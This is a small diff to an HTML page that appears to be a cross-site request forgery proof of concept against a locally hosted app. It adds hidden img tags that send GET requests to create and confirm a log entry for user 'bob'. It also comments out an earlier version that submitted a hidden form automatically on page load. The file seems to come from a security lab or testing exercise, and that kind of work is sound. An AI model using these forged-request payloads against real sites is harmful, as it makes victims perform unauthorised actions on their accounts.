@@ -1,4 +1,9 @@
-<h2>CSRF</h2>
+<h1>CSRF get</h1>
+<body onload="myWindow.close()"></body>
+<img src="http://127.0.0.1:8000/user/bob/create_log/?timeoflog=2001-11-11T09%3A02&login=login&note=I ate some beef at lunch">
+<img src="http://127.0.0.1:8000/confirm_creation">
+
+<!-- <h2>CSRF post</h2>
 <body onload="document.forms[0].submit()"></body>
 <form action="http://127.0.0.1:8000/user/bob/create_log/" method="POST">
 
@@ -7,4 +12,4 @@
 <input type="hidden" name="note" value=""/>
 <input type="submit"/>
 
-</form>
+</form> -->
